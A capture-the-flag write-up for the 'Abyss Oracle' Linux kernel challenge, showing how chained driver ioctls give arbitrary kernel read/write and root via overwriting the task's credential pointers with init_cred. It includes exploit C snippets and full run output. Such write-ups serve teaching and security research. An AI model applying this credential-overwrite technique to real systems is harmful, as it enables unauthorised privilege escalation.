# Abyss Oracle Writeup

## The short version

**Abyss Oracle** is a Linux kernel pwn challenge. It gives an ordinary user a
device named `/dev/abyss_oracle` and asks us to abuse its custom capability
system until we can read `/flag`, which is root-only.

The module tries to be careful: capabilities have owners, states, permissions,
random nonces, and encoded kernel pointers. The problem is that several
perfectly legal operations can be chained together:

1. Keep an object alive through an alias.
2. "Retire" the original handle, which upgrades the underlying object to a
   special state.
3. Merge that object with another capability to gain a privileged permission.
4. Ask the oracle to leak enough information to undo its pointer encoding.
5. Rebind the capability to any kernel address.

That gives us kernel memory read/write. From there, we replace our process's
credentials with the credentials of the kernel's initial root process and open
`/flag` normally.

The final flag was:

```text
Thryve{662a0b7c-e3b6-47e9-bea2-1595483c37d5}
```

---

## What is a kernel pwn challenge?

Programs normally run in **user space**. User-space programs cannot directly
read kernel memory, change their UID, or ignore file permissions. The Linux
kernel runs with much more privilege and enforces those rules.

This challenge adds a custom kernel module, `abyss_oracle.ko`. The module
creates `/dev/abyss_oracle`, which accepts commands through `ioctl()` calls.
An `ioctl` is just a way for a normal program to send a structured request to a
device driver.

The goal is therefore not to smash a normal stack buffer. It is to find a
logical flaw in the driver's API that eventually gives us more power than the
driver intended.

---

## Initial inspection

The handout contained:

```text
bzImage
initramfs.cpio.gz
run-qemu.sh
```

After unpacking the initramfs:

```bash
mkdir extracted
cd extracted
gzip -dc ../initramfs.cpio.gz | cpio -idmv --no-absolute-filenames
```

the important files were:

```text
/abyss_oracle.ko
/init
/bin/dropper
```

The init script does the following:

* Loads `abyss_oracle.ko`.
* Makes `/dev/abyss_oracle` world-readable and writable.
* Makes `/flag` readable only by root.
* Drops to UID/GID 1000.
* Executes `/home/ctf/exploit`.

The supplied QEMU configuration enables the usual kernel protections,
including KASLR, SMEP, SMAP, and KPTI. Luckily, this solution does not need to
execute user-space code in kernel mode or build a kernel ROP chain. It stays
within the driver's intended functions and turns them into memory primitives.

---

## A small handout problem

There was an unrelated local-testing issue: the supplied `bzImage` was Kali
Linux 6.19.14, while the module's version string said it was compiled for:

```text
6.12.95+deb13-cloud-amd64
```

The unmodified module therefore refused to load locally. Even after changing
the version string, a few ABI details had changed, including the stack-canary
style, `struct module::exit`, and the export of `__mutex_init`.

I wrote `patch-local.py` to make the module testable with the supplied local
kernel. These changes are **not part of the vulnerability** and were not sent
to the server. The actual exploit is `exploit.c`.

There is also a harmless typo in `run-qemu.sh`:

```bash
LOCAL_FLAG="${LOCAL_FLAG:-CTF{local_test_only}}"
```

Because of the nested closing brace, explicitly setting `LOCAL_FLAG` adds an
extra `}` to the local test flag.

---

## Reversing the driver

The module was stripped, but `objdump` still showed the imported kernel
functions and all of the control flow:

```bash
objdump -drwC -Mintel extracted/abyss_oracle.ko > module.asm
readelf -rW extracted/abyss_oracle.ko > relocs.txt
```

The main interface is a group of ioctls with type byte `0xa8`:

| Number | Value | Name used in my exploit | Purpose |
|---:|---:|---|---|
| 1 | `0x4018a801` | `AB_CREATE` | Create a capability |
| 2 | `0x4004a802` | `AB_SEAL` | Move it into the sealed state |
| 3 | `0x4010a803` | `AB_ALIAS` | Put another handle on the same object |
| 4 | `0x4010a804` | `AB_MERGE` | Combine two capabilities |
| 5 | `0x4004a805` | `AB_RETIRE` | Retire a capability |
| 6 | `0xc018a806` | `AB_READ` | Read through a capability |
| 7 | `0x4018a807` | `AB_WRITE` | Write through a capability |
| 8 | `0x4018a808` | `AB_BIND` | Change a privileged capability's base |
| 9 | `0xc028a809` | `AB_LEAK` | Return capability metadata |

The basic requests look like this:

```c
struct create_req {
    uint32_t slot;
    uint32_t len;
    uint64_t flags;
    uint64_t user_buf;
};

struct rw_req {
    uint32_t slot;
    uint32_t len;
    uint64_t off;
    uint64_t user_buf;
};

struct bind_req {
    uint32_t slot;
    uint32_t pad;
    uint64_t encoded;
    uint64_t len;
};
```

### Thinking of capabilities as keys

A capability can be viewed as a key with several labels attached to it:

* Who owns the key?
* Is it new, sealed, merged, or retired?
* Is it allowed to read, write, alias, merge, or retire?
* What kernel address and size does it cover?

The low five flag bits correspond to the operations we need:

```text
0x01  read
0x02  write
0x04  alias
0x08  merge
0x10  retire
```

A merged object may also receive the important privileged bit `0x20`.

The driver stores an encoded base address rather than the plain kernel
pointer. Simplified, the encoding is:

```text
encoded = decoded_base ^ context_secret ^ rol64(nonce, 17)
```

This looks useful at first: leaking only the encoded value would not tell us
the real kernel address. Unfortunately, the leak ioctl returns both sides of
the equation.

---

## Building the privileged capability

We begin by creating two capabilities, A and B, with every low permission bit:

```c
flags = 0x1f;
```

Both are sealed. A sealed capability normally has state 2.

Next, we alias A into another slot. Both slots now refer to the same underlying
kernel object, and its reference count is two.

```text
slot 0 ----+
           +---- capability A
slot 2 ----+
```

We then retire slot 0. The driver changes the underlying object to state 4 and
drops slot 0's reference. Because slot 2 is still holding a reference, the
object is not destroyed.

This is the key logical mistake: **retiring one handle changes the shared
object's state, but an alias can still use that object afterward.**

Now we merge aliased A from slot 2 with sealed B from slot 1. The merge code
allows A to be in state 2 or state 4. When A is in state 4, the new merged
capability receives bit `0x20`:

```c
if (a->state == 4)
    merged->flags |= 0x20;
```

The merged object also inherits A and B's low permission flags, so it has read,
write, and the privileged `0x20` bit at the same time.

In code, the complete state transition is:

```c
create(A, 0x1f);
create(B, 0x1f);
seal(A);
seal(B);
alias(A, A_alias);
retire(A);                 // A_alias still points to state-4 A
merge(A_alias, B, merged); // merged gets privileged bit 0x20
```

---

## Defeating the pointer encoding

`AB_LEAK` returns the following information for the merged capability:

```c
struct leak_req {
    uint32_t slot;
    uint32_t pad;
    uint64_t nonce;
    uint64_t encoded;
    uint64_t decoded;
    uint64_t init_task;
};
```

Since it gives us `nonce`, `encoded`, and `decoded`, recovering the supposedly
secret context value is basic algebra:

```c
secret = encoded ^ decoded ^ rol64(nonce, 17);
```

We can now encode any address we want:

```c
new_encoded = target ^ secret ^ rol64(nonce, 17);
```

`AB_BIND` accepts this value for a merged capability with bit `0x20`. It checks
that decoding it produces an aligned kernel address, then stores it as the new
base.

That means the capability is no longer limited to the buffer it originally
covered. We can point it at a task structure, credential structure, or almost
any other kernel address.

---

## Arbitrary kernel read and write

My read helper performs two operations:

1. Bind the merged capability to the requested kernel address.
2. Use `AB_READ` to copy data from that address into user space.

```c
static void kread(uint64_t addr, void *out, uint32_t len) {
    bind_kernel(addr, len);

    struct rw_req r = {
        .slot = arb_slot,
        .len = len,
        .off = 0,
        .user_buf = (uint64_t)out,
    };

    ioctl(fd, AB_READ, &r);
}
```

The write operation has one extra quirk. Before copying the user's qword, the
module XORs it with this constant:

```text
0xa55a5aa55aa55aa5
```

XOR is reversible, so to write `wanted_value`, we simply send:

```c
sent_value = wanted_value ^ 0xa55a5aa55aa55aa5ULL;
```

The driver XORs it again, producing the original wanted value:

```text
(wanted ^ constant) ^ constant = wanted
```

The write path rejects very high kernel-image addresses, but normal allocated
objects such as our `task_struct` live in the direct map and pass its check.
That is enough for the credential attack.

---

## Finding our process without hardcoded offsets

The leak ioctl conveniently returns `init_task`, the address of Linux's first
task structure. A quick exploit could hardcode offsets for one exact kernel,
but the module and supplied kernel versions did not initially agree. I made the
exploit find the offsets dynamically instead.

### Finding the task list

Linux links all processes through a doubly linked list embedded in each
`task_struct`. A doubly linked list has a useful consistency rule:

```text
head->next->prev == head
head->prev->next == head
```

The exploit scans aligned fields inside `init_task` and tests that rule. For
each likely list, it walks the entries and treats:

```text
task_address = list_entry - candidate_offset
```

as a possible task structure.

Inside each candidate task, it searches for two adjacent 32-bit values equal
to our user-space PID. Those are likely `pid` and `tgid`. It also checks for
the process name `exploit` nearby to avoid false positives.

On the remote instance this discovered:

```text
tasks_off = 0x9c0
pid_off   = 0xa90
```

### Finding the credentials

Every task has two nearby pointers:

```c
const struct cred *real_cred;
const struct cred *cred;
```

For a normal process, both usually point to the same credential object. The
same is true for `init_task`, except its pointers lead to `init_cred`, which is
root's initial credential object.

The exploit searches for adjacent equal pointers in both structures and then
validates the UID/GID fields:

* `init_cred` has UID/GID values of 0.
* Our old credentials have UID/GID values of 1000.

On the server, the credential pointer offsets were found as:

```text
real_cred = 0xc98
cred      = 0xca0
```

Finally, we replace both pointers in our own task:

```c
kwrite64(current_task + real_cred_off, init_cred);
kwrite64(current_task + cred_off,      init_cred);
```

After those two writes, the kernel sees our process as using root's
credentials:

```text
[+] credentials replaced, uid=0 euid=0
```

At that point there is no need for a shell or kernel ROP. The exploit simply
opens and reads `/flag`.

---

## Building and testing

The exploit must be statically linked because the tiny initramfs does not ship
the normal glibc shared libraries:

```bash
gcc -static -O2 -Wall -Wextra -s -o exploit exploit.c
```

For local testing with the mismatched handout kernel:

```bash
python3 patch-local.py

(cd extracted && \
  find . -print0 | cpio --null -o --format=newc --quiet | \
  gzip -9 > ../local-initramfs.cpio.gz)

LOCAL_FLAG='CTF{local_test}' \
INITRAMFS="$PWD/local-initramfs.cpio.gz" \
bash ./run-qemu.sh ./exploit
```

The important part of the local result was:

```text
[+] current     = 0xffff...
[+] init_cred   = 0xffffffff...
[+] credentials replaced, uid=0 euid=0
[+] FLAG: CTF{local_test}}
```

Again, the double closing brace is just the local runner typo.

---

## Sending it to the remote instance

The service on port 10077 does **not** accept a base64-encoded binary. Its
prompt says:

```text
Exploit URL:
```

So it expects a URL from which it can download the ELF. I hosted the current
directory with Python and exposed it temporarily with Cloudflare Tunnel:

Terminal 1:

```bash
python3 -m http.server 8000 --bind 127.0.0.1
```

Terminal 2:

```bash
cloudflared tunnel --url http://127.0.0.1:8000
```

Cloudflare printed a temporary `trycloudflare.com` hostname. I then submitted
the direct URL to `/exploit`:

```bash
printf '%s\n' 'https://YOUR-NAME.trycloudflare.com/exploit' | \
  nc inst.thryvectf.org 10077
```

The remote output was:

```text
Exploit URL: [+] downloading exploit
[+] booting instance
[*] Abyss Oracle local exploit, pid=127 uid=1000
[+] nonce       = 0xc16f53f0254537a3
[+] encoded     = 0x6d76d3d445f1c53b
[+] decoded     = 0xffff88bf45d718b8
[+] cookie      = 0x356911e16f615f5d
[+] init_task   = 0xffffffffbd813100
[+] tasks_off   = 0x9c0
[+] pid_off     = 0xa90
[+] current     = 0xffff88bf45d91980
[+] cred offsets= 0xc98/0xca0
[+] old cred    = 0xffff88bf45d43780
[+] init_cred   = 0xffffffffbd814800
[+] credentials replaced, uid=0 euid=0
[+] FLAG: Thryve{662a0b7c-e3b6-47e9-bea2-1595483c37d5}
```

---

## Why the bug matters

There is no single dramatic unchecked buffer overflow here. The issue is a
chain of smaller design mistakes:

* Object state is shared between aliases, but retiring one alias does not make
  all aliases unusable.
* A state-4 object is accepted by merge and grants a privileged flag.
* The metadata leak exposes enough values to recover the pointer-encoding
  secret.
* The privileged bind operation allows the base to be changed to an arbitrary
  kernel address.
* Read and write permissions survive the merge.

Each feature almost makes sense by itself. Together, they create arbitrary
kernel memory access. That is what made this challenge fun: the solution is
less about one bad instruction and more about understanding how several API
rules interact.

